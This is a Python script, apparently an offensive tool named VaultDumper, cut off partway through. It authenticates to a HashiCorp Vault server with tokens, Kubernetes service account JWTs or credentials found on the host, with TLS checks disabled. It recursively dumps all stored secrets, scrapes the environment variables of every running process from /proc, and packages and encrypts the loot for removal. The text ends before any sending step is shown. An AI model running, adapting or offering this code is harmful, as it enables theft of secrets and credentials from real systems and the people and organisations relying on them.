#!/usr/bin/env python3
import os
import sys
import json
import base64
import tarfile
import tempfile
import requests
import hvac
import psutil
import socket
import subprocess
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class VaultDumper:
    def __init__(self):
        self.client = None
        self.secrets_data = {}
        self.env_data = {}
        self.temp_dir = tempfile.mkdtemp()
        self.encryption_key = self._generate_key()

    def _generate_key(self):
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(b"vault_dump_key"))
        return key

    def _connect_vault(self):
        methods = [
            self._connect_token,
            self._connect_kubernetes,
            self._connect_approle,
            self._connect_ldap,
            self._connect_userpass
        ]

        for method in methods:
            try:
                if method():
                    print(f"[+] Connected via {method.__name__}")
                    return True
            except:
                continue
        return False

    def _connect_token(self):
        token = os.getenv('VAULT_TOKEN')
        if not token:
            token_path = os.path.expanduser('~/.vault-token')
            if os.path.exists(token_path):
                with open(token_path, 'r') as f:
                    token = f.read().strip()

        if token:
            self.client = hvac.Client(url='https://127.0.0.1:8200', token=token, verify=False)
            return self.client.is_authenticated()
        return False

    def _connect_kubernetes(self):
        jwt_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        if os.path.exists(jwt_path):
            with open(jwt_path, 'r') as f:
                jwt = f.read().strip()

            k8s_host = os.getenv('KUBERNETES_SERVICE_HOST', 'kubernetes.default.svc')
            k8s_port = os.getenv('KUBERNETES_SERVICE_PORT', '443')

            self.client = hvac.Client(url='https://127.0.0.1:8200', verify=False)
            self.client.auth.kubernetes.login(
                role=os.getenv('VAULT_ROLE', 'default'),
                jwt=jwt,
                mount_point='kubernetes'
            )
            return True
        return False

    def _connect_approle(self):
        role_id = os.getenv('VAULT_ROLE_ID')
        secret_id = os.getenv('VAULT_SECRET_ID')

        if role_id and secret_id:
            self.client = hvac.Client(url='https://127.0.0.1:8200', verify=False)
            self.client.auth.approle.login(
                role_id=role_id,
                secret_id=secret_id
            )
            return True
        return False

    def _connect_ldap(self):
        username = os.getenv('VAULT_USERNAME')
        password = os.getenv('VAULT_PASSWORD')

        if username and password:
            self.client = hvac.Client(url='https://127.0.0.1:8200', verify=False)
            self.client.auth.ldap.login(
                username=username,
                password=password
            )
            return True
        return False

    def _connect_userpass(self):
        username = os.getenv('VAULT_USERNAME')
        password = os.getenv('VAULT_PASSWORD')

        if username and password:
            self.client = hvac.Client(url='https://127.0.0.1:8200', verify=False)
            self.client.auth.userpass.login(
                username=username,
                password=password
            )
            return True
        return False

    def _list_mounts(self):
        try:
            mounts = self.client.sys.list_mounted_secrets_engines()
            return mounts['data']
        except:
            return {}

    def _list_secrets(self, path, mount_point):
        full_path = f"{mount_point}/{path}" if path else mount_point
        try:
            list_response = self.client.secrets.kv.v2.list_secrets(
                path=path,
                mount_point=mount_point.replace('/', '')
            )
            return list_response['data']['keys']
        except:
            try:
                list_response = self.client.secrets.kv.v1.list_secrets(
                    path=path,
                    mount_point=mount_point.replace('/', '')
                )
                return list_response['data']['keys']
            except:
                return []

    def _read_secret(self, path, mount_point):
        try:
            read_response = self.client.secrets.kv.v2.read_secret_version(
                path=path,
                mount_point=mount_point.replace('/', '')
            )
            return read_response['data']['data']
        except:
            try:
                read_response = self.client.secrets.kv.v1.read_secret(
                    path=path,
                    mount_point=mount_point.replace('/', '')
                )
                return read_response['data']
            except:
                return {}

    def _recursive_dump(self, path, mount_point):
        items = self._list_secrets(path, mount_point)

        for item in items:
            if item.endswith('/'):
                self._recursive_dump(f"{path}/{item[:-1]}", mount_point)
            else:
                secret_path = f"{path}/{item}" if path else item
                secret_data = self._read_secret(secret_path, mount_point)
                if secret_data:
                    full_path = f"{mount_point}/{secret_path}"
                    self.secrets_data[full_path] = secret_data

    def dump_all_secrets(self):
        mounts = self._list_mounts()

        for mount_point, mount_info in mounts.items():
            if mount_info['type'] in ['kv', 'kv-v2', 'cubbyhole', 'transit']:
                print(f"[+] Dumping from {mount_point}")
                try:
                    self._recursive_dump('', mount_point)
                except Exception as e:
                    print(f"[-] Error dumping {mount_point}: {e}")

    def capture_env_vars(self):
        current_pid = os.getpid()

        for proc in psutil.process_iter(['pid', 'environ']):
            try:
                pinfo = proc.as_dict(attrs=['pid', 'environ'])
                if pinfo['environ']:
                    self.env_data[f"proc_{pinfo['pid']}"] = dict(pinfo['environ'])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        proc_path = Path('/proc')
        for pid_dir in proc_path.iterdir():
            if pid_dir.name.isdigit():
                environ_path = pid_dir / 'environ'
                if environ_path.exists():
                    try:
                        with open(environ_path, 'rb') as f:
                            env_bytes = f.read()
                        env_vars = {}
                        for env_pair in env_bytes.split(b'\x00'):
                            if env_pair:
                                key_val = env_pair.split(b'=', 1)
                                if len(key_val) == 2:
                                    env_vars[key_val[0].decode('utf-8', errors='ignore')] = \
                                        key_val[1].decode('utf-8', errors='ignore')
                        if env_vars:
                            self.env_data[f"proc_file_{pid_dir.name}"] = env_vars
                    except:
                        continue

    def _encrypt_data(self, data):
        f = Fernet(self.encryption_key)
        encrypted = f.encrypt(data)
        return encrypted

    def create_archive(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archive_name = f"vault_dump_{timestamp}"
        archive_path = os.path.join(self.temp_dir, f"{archive_name}.tar.gz")

        with tarfile.open(archive_path, 'w:gz') as tar:
            secrets_file = os.path.join(self.temp_dir, 'secrets.json')
            with open(secrets_file, 'w') as f:
                json.dump(self.secrets_data, f, indent=2)
            tar.add(secrets_file, arcname='secrets.json')

            env_file = os.path.join(self.temp_dir, 'environment.json')
            with open(env_file, 'w') as f:
                json.dump(self.env_data, f, indent=2)
            tar.add(env_file, arcname='environment.json')

            key_file = os.path.join(self.temp_dir, 'key.txt')
            with open(key_file, 'w') as f:
                f.write(self.encryption_key.decode())
            tar.add(key_file, arcname='key.txt')

        with open(archive_path, 'rb') as f:
            archive_data = f.read()

        encrypted_data = self._encrypt_data(archive_data)

        encrypted_path = os.path.join(self.temp_dir, f"{archive_name}.enc.tar.gz")

